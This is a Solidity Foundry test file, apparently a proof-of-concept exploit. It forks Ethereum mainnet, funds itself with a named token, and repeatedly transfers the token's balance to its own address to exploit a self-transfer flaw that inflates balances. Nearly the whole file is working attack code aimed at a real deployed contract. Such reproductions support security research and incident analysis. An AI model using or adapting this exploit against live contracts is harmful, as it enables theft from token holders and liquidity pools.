// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IWETH9.sol";
import "@interface/IERC20.sol";
import "@interface/IWBNB.sol";

IERC20 constant gpuToken = IERC20(
    address(0x5116aB7A5166FD4019933BF139195F24E183846E)
);
WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

contract GPUExploit is Test {
    uint32 swapFeeTotal = 10000;
    uint32 swapFeeBase = 25;

    function setUp() external {
        vm.createSelectFork("mainnet");
        deal(address(gpuToken), address(this), 1000 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        for (int i = 0; i < 10; i++) {
            console.log(gpuToken.balanceOf(address(this)));
            gpuToken.transfer(address(this), gpuToken.balanceOf(address(this)));
        }
    }
}
